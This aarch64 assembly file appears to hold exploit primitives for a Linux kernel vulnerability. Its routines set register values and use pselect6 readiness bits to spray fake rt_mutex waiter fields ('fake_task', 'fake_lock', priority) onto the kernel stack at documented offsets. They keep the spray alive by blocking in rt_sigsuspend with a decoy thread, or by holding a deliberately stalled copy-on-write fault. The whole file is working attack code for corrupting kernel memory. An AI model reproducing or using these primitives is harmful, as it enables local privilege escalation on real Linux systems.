/* overlay_pselect_asm -- register-coloring pselect6 overlay
 *
 * C prototype:
 *   long overlay_pselect_asm(uint64_t lock,   // x0
 *                            uint64_t task,   // x1
 *                            uint64_t prio,   // x2
 *                            int nfds,        // x3
 *                            void *readfds,   // x4
 *                            void *timeout);  // x5
 *
 * __do_sys_pselect6 (frame 0x90) saves callee-saved registers:
 *   x27 -> SP0-0x198 = W.tree_entry.pc
 *   x26 -> SP0-0x190 = W.tree_entry.right
 *   x25 -> SP0-0x188 = W.tree_entry.left
 *   x24 -> SP0-0x180 = W.pi_tree.pc
 *   x23 -> SP0-0x178 = W.pi_tree.right
 *   x22 -> SP0-0x170 = W.pi_tree.left
 *   x21 -> SP0-0x168 = W.task
 *   x20 -> SP0-0x160 = W.lock
 *   x19 -> SP0-0x158 = W.prio
 */

.text
.globl overlay_pselect_asm
.type overlay_pselect_asm, %function
overlay_pselect_asm:
    /* Save callee-saved registers */
    stp x19, x20, [sp, #-0x70]!
    stp x21, x22, [sp, #0x10]
    stp x23, x24, [sp, #0x20]
    stp x25, x26, [sp, #0x30]
    stp x27, x28, [sp, #0x40]
    stp x29, x30, [sp, #0x50]

    /* Stash C args to callee-saved temps (x15-x17 are scratch on aarch64) */
    mov x15, x0             /* lock */
    mov x16, x1             /* task */
    mov x17, x2             /* prio */
    mov x9, x3              /* nfds */
    mov x10, x4             /* readfds */
    mov x11, x5             /* timeout */

    /* Load waiter field values into callee-saved registers */
    mov x19, x17            /* W.prio */
    mov x20, x15            /* W.lock */
    mov x21, x16            /* W.task */
    mov x22, xzr            /* W.pi_tree.left = 0 */
    mov x23, xzr            /* W.pi_tree.right = 0 */
    mov x24, xzr            /* W.pi_tree.pc = 0 */
    mov x25, xzr            /* W.tree_entry.left = 0 */
    mov x26, xzr            /* W.tree_entry.right = 0 */
    mov x27, xzr            /* W.tree_entry.pc = 0 (BLACK root) */

    /* pselect6 syscall args */
    mov x0, x9              /* nfds */
    mov x1, x10             /* readfds */
    mov x2, xzr             /* writefds = NULL */
    mov x3, xzr             /* exceptfds = NULL */
    mov x4, x11             /* timeout */
    mov x5, xzr             /* sigmask = NULL */
    mov x8, #72             /* __NR_pselect6 */
    svc #0

    /* x0 = return value */

    /* Restore callee-saved registers */
    ldp x29, x30, [sp, #0x50]
    ldp x27, x28, [sp, #0x40]
    ldp x25, x26, [sp, #0x30]
    ldp x23, x24, [sp, #0x20]
    ldp x21, x22, [sp, #0x10]
    ldp x19, x20, [sp], #0x70
    ret

.size overlay_pselect_asm, .-overlay_pselect_asm

/* select_then_sigsuspend_asm -- readiness spray + sigsuspend blocker
 *
 * C prototype:
 *   long select_then_sigsuspend_asm(int nfds,           // x0
 *                                   fd_set *readfds,    // x1
 *                                   fd_set *writefds,   // x2
 *                                   fd_set *exceptfds,  // x3
 *                                   uint64_t *sigmask); // x4
 *
 * Two back-to-back syscalls with zero intervening userspace logic.
 *
 * 1. pselect6(nfds, readfds, writefds, exceptfds, NULL, NULL)
 *    Returns immediately (all watched fds are ready). The res_readfds
 *    result words on the kernel stack hold the spray pattern:
 *      res_readfds word 2 = fake_task  (fds 128-191 readiness)
 *      res_readfds word 3 = fake_lock  (fds 192-255 readiness)
 *      res_readfds word 4 = prio value (fds 256-319 readiness)
 *
 * 2. rt_sigsuspend(sigmask, 8)
 *    Blocks in schedule -> __schedule. The entire sigsuspend chain
 *    (0x10 + 0x40 + 0x20 + 0x80 = 0xF0 from SP0) stays far above
 *    the waiter fields at SP0-0x168. The spray values survive.
 *    Woken by SIGUSR1 (returns -EINTR).
 *
 * The sigmask pointer (x4) must point to a uint64_t with SIGUSR1
 * unblocked (bit 9 clear in the mask, all others set).
 */
.globl select_then_sigsuspend_asm
.type select_then_sigsuspend_asm, %function
select_then_sigsuspend_asm:
    stp x29, x30, [sp, #-0x20]!
    str x19, [sp, #0x10]
    mov x29, sp

    mov x19, x4             /* save sigmask pointer */

    /* pselect6(nfds, readfds, writefds, exceptfds, NULL, NULL) */
    mov x4, xzr             /* timeout = NULL */
    mov x5, xzr             /* sigmask = NULL */
    mov x8, #72             /* __NR_pselect6 */
    svc #0
    /* x0 = number of ready fds. Kernel stack spray is live. */

    /* rt_sigsuspend(sigmask, sigsetsize=8)
     * Blocks in schedule(); the caller MUST have a same-mm decoy thread
     * running on this CPU so the context switch stays intra-process
     * (skips check_and_switch_context -> new_context, which would clobber
     * the waiter fields at SP0-0x168 with its 0x70-byte frame). */
    mov x0, x19             /* sigmask pointer */
    mov x1, #8              /* sigsetsize */
    mov x8, #133            /* __NR_rt_sigsuspend */
    svc #0
    /* x0 = -EINTR (woken by signal) */

    ldr x19, [sp, #0x10]
    ldp x29, x30, [sp], #0x20
    ret

.size select_then_sigsuspend_asm, .-select_then_sigsuspend_asm

/* readiness_pselect_asm -- pselect6 without a follow-up blocker.
 *
 * The writefds pointer names a prefaulted MAP_PRIVATE file mapping. Input
 * copy reads its existing file PTE; result copy takes the deliberately
 * blocked COW fault while core_sys_select's deep stack frame stays live. */
.globl readiness_pselect_asm
.type readiness_pselect_asm, %function
readiness_pselect_asm:
    mov x4, xzr             /* timeout = NULL */
    mov x5, xzr             /* sigmask = NULL */
    mov x8, #72             /* __NR_pselect6 */
    svc #0
    ret

.size readiness_pselect_asm, .-readiness_pselect_asm
